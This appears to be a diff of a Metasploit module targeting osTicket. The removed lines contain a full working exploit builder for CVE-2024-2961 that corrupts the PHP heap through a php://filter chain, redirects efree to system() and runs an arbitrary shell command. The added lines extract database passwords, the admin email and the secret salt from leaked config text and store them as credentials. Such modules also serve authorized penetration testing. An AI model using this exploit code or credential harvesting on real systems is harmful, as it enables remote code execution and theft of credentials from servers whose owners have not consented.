-    # @return [String] QP-encoded representation
-    def cnext_qpe(data)
-      data.bytes.map { |b| format('=%02X', b) }.join.b
-    end
+          unless found_any
+            print_line
+            print_line('=' * 70)
+            print_line('KEY FINDINGS')
+            print_line('=' * 70)
+            found_any = true
+          end
+          print_good("  #{key}: #{match[1]}")
 
-    # Packs 64-bit pointers through the CNEXT encoding pipeline
-    # (QP encode -> triple chunked -> compressed bucket).
-    #
-    # @param ptrs [Array<Integer>] 64-bit pointer values
-    # @param size [Integer, nil] expected total byte size
-    # @return [String] encoded pointer bucket
-    def cnext_ptr_bucket(*ptrs, size: nil)
-      if size
-        raise ArgumentError, "ptr count mismatch" unless ptrs.length * 8 == size
+          case key
+          when 'DBPASS'
+            db_user_match = text.match(/define\('DBUSER','([^']+)'\)/)
+            report_cred(db_user_match[1], match[1], 'osTicket database') if db_user_match
+          when 'ADMIN_EMAIL'
+            report_note(host: rhost, port: rport, type: 'osticket.admin_email', data: { email: match[1] })
+          when 'SECRET_SALT'
+            report_note(host: rhost, port: rport, type: 'osticket.secret_salt', data: { salt: match[1] })
+          end
+        end
       end
-
-      bucket = ptrs.pack('Q<*')
-      bucket = cnext_qpe(bucket)
-      bucket = cnext_chunked_chunk(bucket)
-      bucket = cnext_chunked_chunk(bucket)
-      bucket = cnext_chunked_chunk(bucket)
-      cnext_compressed_bucket(bucket)
     end
 
-    # Compresses data for PHP's zlib.inflate filter (raw deflate, no header).
+    # Reports a credential pair to the Metasploit database.
     #
-    # @param data [String] data to compress
-    # @return [String] raw deflate data
-    def cnext_compress(data)
-      Zlib::Deflate.deflate(data, 9)[2..-5]
-    end
-
-    # ─────────────────────────────────────────────────────────
-    # CNEXT: Exploit Path Builder
-    # ─────────────────────────────────────────────────────────
-
-    # Builds the complete CNEXT PHP filter chain URI that exploits
-    # CVE-2024-2961 to overwrite zend_mm_heap and achieve RCE.
-    #
-    # The exploit works in 5 steps:
-    #   Step 0: Decompress and dechunk to set up heap allocations
-    #   Step 1: Allocate chunks to reverse the freelist order
-    #   Step 2: Write a fake freelist pointer into a chunk
-    #   Step 3: Trigger iconv buffer overflow (UTF-8 -> ISO-2022-CN-EXT)
-    #   Step 4: Allocate at controlled address, overwrite zend_mm_heap
-    #           free_slot[] and custom_heap to redirect efree -> system()
-    #
-    # @param command    [String] shell command to execute
-    # @param heap_addr  [Integer] address of PHP's zend_mm_heap
-    # @param libc_addrs [Hash] { malloc:, system:, realloc: } absolute addresses
-    # @param pad_count  [Integer] padding chunk count (default 20)
-    # @return [String] the php://filter/... data: URI
-    def cnext_build_exploit_path(command, heap_addr, libc_addrs, pad_count = 20)
-      addr_emalloc  = libc_addrs[:malloc]
-      addr_efree    = libc_addrs[:system]  # efree -> system() for RCE
-      addr_erealloc = libc_addrs[:realloc]
-
-      addr_free_slot   = heap_addr + CNEXT_OFFSET_FREE_SLOT
-      addr_custom_heap = heap_addr + CNEXT_OFFSET_CUSTOM_HEAP
-      addr_fake_bin    = addr_free_slot - 0x10
-
-      cs = CNEXT_CHUNK_SIZE
-
-      # ── Pad: fill heap to ensure contiguous ordered allocations ──
-      pad_size = cs - 0x18
-      pad = ("\x00" * pad_size).b
-      pad = cnext_chunked_chunk(pad, pad.length + 6)
-      pad = cnext_chunked_chunk(pad, pad.length + 6)
-      pad = cnext_chunked_chunk(pad, pad.length + 6)
-      pad = cnext_compressed_bucket(pad)
-
-      # ── Step 1: Reverse freelist order ──
-      step1 = "\x00".b
-      step1 = cnext_chunked_chunk(step1)
-      step1 = cnext_chunked_chunk(step1)
-      step1 = cnext_chunked_chunk(step1, cs)
-      step1 = cnext_compressed_bucket(step1)
-
-      # ── Step 2: Place fake freelist pointer ──
-      step2_size = 0x48
-      step2 = ("\x00" * (step2_size + 8)).b
-      step2 = cnext_chunked_chunk(step2, cs)
-      step2 = cnext_chunked_chunk(step2)
-      step2 = cnext_compressed_bucket(step2)
-
-      # "0\n" prefix protects this chunk from ISO-2022-CN-EXT conversion
-      step2_write_ptr = "0\n".b.ljust(step2_size, "\x00".b) + [addr_fake_bin].pack('Q<')
-      step2_write_ptr = cnext_chunked_chunk(step2_write_ptr, cs)
-      step2_write_ptr = cnext_chunked_chunk(step2_write_ptr)
-      step2_write_ptr = cnext_compressed_bucket(step2_write_ptr)
-
-      # ── Step 3: Trigger iconv buffer overflow ──
-      step3 = ("\x00" * cs).b
-      step3 = cnext_chunked_chunk(step3)
-      step3 = cnext_chunked_chunk(step3)
-      step3 = cnext_chunked_chunk(step3)
-      step3 = cnext_compressed_bucket(step3)
-
-      step3_overflow = ("\x00" * (cs - CNEXT_BUG.length) + CNEXT_BUG).b
-      step3_overflow = cnext_chunked_chunk(step3_overflow)
-      step3_overflow = cnext_chunked_chunk(step3_overflow)
-      step3_overflow = cnext_chunked_chunk(step3_overflow)
-      step3_overflow = cnext_compressed_bucket(step3_overflow)
-
-      # ── Step 4: Overwrite zend_mm_heap ──
-      step4 = ("=00" + "\x00" * (cs - 1)).b
-      step4 = cnext_chunked_chunk(step4)
-      step4 = cnext_chunked_chunk(step4)
-      step4 = cnext_chunked_chunk(step4)
-      step4 = cnext_compressed_bucket(step4)
-
-      # Overwrite free_slot[] - allocated 0x10 before data, hence two fillers
-      step4_pwn = cnext_ptr_bucket(
-        0x200000, 0,             # filler (0x10 before actual free_slot)
-        0, 0,                    # free_slot[0], free_slot[1]
-        addr_custom_heap,        # free_slot[2] -> next alloc lands at custom_heap
-        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-        heap_addr,               # free_slot[17] (offset 0x140)
-        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
-        size: cs
+    # @param username     [String] credential username
+    # @param password     [String] credential password
+    # @param service_name [String] service label (e.g. 'osTicket database')
+    def report_cred(username, password, service_name)
+      create_credential(
+        module_fullname: fullname,
+        workspace_id:    myworkspace_id,
+        origin_type:     :service,
+        address:         rhost,
+        port:            rport,
+        protocol:        'tcp',
+        service_name:    service_name,
+        username:        username,
+        private_data:    password,
+        private_type:    :password
       )
-
-      # Overwrite custom_heap function pointers
-      step4_custom_heap = cnext_ptr_bucket(
-        addr_emalloc, addr_efree, addr_erealloc,
-        size: 0x18
-      )
-
-      # Command string + use_custom_heap activation
-      step4_uch_size = 0x140
-      cmd_str = "kill -9 $PPID; #{command}\x00".b
-      raise ArgumentError, "Command too long (#{cmd_str.length} > #{step4_uch_size})" if cmd_str.length > step4_uch_size
-
-      cmd_str = cmd_str.ljust(step4_uch_size, "\x00".b)
-      step4_uch = cnext_qpe(cmd_str)
-      step4_uch = cnext_chunked_chunk(step4_uch)
-      step4_uch = cnext_chunked_chunk(step4_uch)
-      step4_uch = cnext_chunked_chunk(step4_uch)
-      step4_uch = cnext_compressed_bucket(step4_uch)
-
-      # ── Assemble all pages ──
-      pages = ''.b
-      pages << step4 * 3
-      pages << step4_pwn
-      pages << step4_custom_heap
-      pages << step4_uch
-      pages << step3_overflow
-      pages << pad * pad_count
-      pages << step1 * 3
-      pages << step2_write_ptr
-      pages << step2 * 2
-
-      # Double-compress and encode as data: URI
-      resource = cnext_compress(cnext_compress(pages))
-      resource_b64 = Rex::Text.encode_base64(resource)
-
-      filters = [
-        'zlib.inflate',
-        'zlib.inflate',
-        'dechunk', 'convert.iconv.L1.L1',                   # Step 0
-        'dechunk', 'convert.iconv.L1.L1',                   # Step 1
-        'dechunk', 'convert.iconv.L1.L1',                   # Step 2
-        'dechunk', 'convert.iconv.UTF-8.ISO-2022-CN-EXT',   # Step 3
-        'convert.quoted-printable-decode', 'convert.iconv.L1.L1' # Step 4
-      ]
-
-      "php://filter/read=#{filters.join('|')}/resource=data:text/plain;base64,#{resource_b64}"
+    rescue StandardError => e
+      vprint_error("Failed to store credential: #{e}")
     end
-
-    private
 
     # Detects the reply textarea field name from the ticket page HTML.
     #
